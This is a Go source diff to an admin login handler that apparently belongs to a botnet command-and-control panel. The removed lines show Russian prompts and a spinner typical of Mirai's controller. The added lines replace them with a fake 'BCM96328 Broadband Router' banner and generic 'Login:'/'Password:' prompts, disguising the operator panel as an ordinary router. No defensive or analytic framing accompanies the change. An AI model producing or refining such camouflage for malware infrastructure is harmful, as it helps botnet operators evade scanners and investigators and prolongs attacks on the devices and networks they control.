@@ -25,17 +25,11 @@ func (this *Admin) Handle() {
         this.conn.Write([]byte("\033[?1049l"))
     }()
 
-    headerb, err := ioutil.ReadFile("prompt.txt")
-    if err != nil {
-        return
-    }
-
-    header := string(headerb)
-    this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))
+    this.conn.Write([]byte("BCM96328 Broadband Router"))
 
     // Get username
     this.conn.SetDeadline(time.Now().Add(60 * time.Second))
-    this.conn.Write([]byte("\033[34;1mпользователь\033[33;3m: \033[0m"))
+    this.conn.Write([]byte("Login:"))
     username, err := this.ReadLine(false)
     if err != nil {
         return
@@ -43,25 +37,16 @@ func (this *Admin) Handle() {
 
     // Get password
     this.conn.SetDeadline(time.Now().Add(60 * time.Second))
-    this.conn.Write([]byte("\033[34;1mпароль\033[33;3m: \033[0m"))
+    this.conn.Write([]byte("Password:"))
     password, err := this.ReadLine(true)
     if err != nil {
         return
     }
 
-    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
-    this.conn.Write([]byte("\r\n"))
-    spinBuf := []byte{'-', '\\', '|', '/'}
-    for i := 0; i < 15; i++ {
-        this.conn.Write(append([]byte("\r\033[37;1mпроверив счета... \033[31m"), spinBuf[i % len(spinBuf)]))
-        time.Sleep(time.Duration(300) * time.Millisecond)
-    }
-
     var loggedIn bool
     var userInfo AccountInfo
     if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
-        this.conn.Write([]byte("\r\033[32;1mпроизошла неизвестная ошибка\r\n"))
-        this.conn.Write([]byte("\033[31mнажмите любую клавишу для выхода. (any key)\033[0m"))
+        this.conn.Write([]byte("Login incorrect. Try again."))
         buf := make([]byte, 1)
         this.conn.Read(buf)
         return
